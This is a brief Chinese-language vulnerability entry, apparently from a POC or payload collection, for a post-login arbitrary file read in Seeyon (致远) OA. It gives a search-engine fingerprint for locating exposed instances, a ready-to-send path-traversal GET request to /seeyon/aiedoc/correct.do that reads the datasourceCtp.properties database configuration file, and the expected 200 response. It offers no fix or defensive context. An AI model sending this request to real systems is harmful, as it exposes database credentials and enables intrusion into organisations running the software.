# 致远OAcorrect任意文件读取（后台）漏洞

致远OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="致远互联-OA"`
- **请求**：`GET /seeyon/aiedoc/correct.do?method=downloadErrorReport&fileName=../../../conf/datasourceCtp.properties HTTP/1.1`
- **响应特征**：200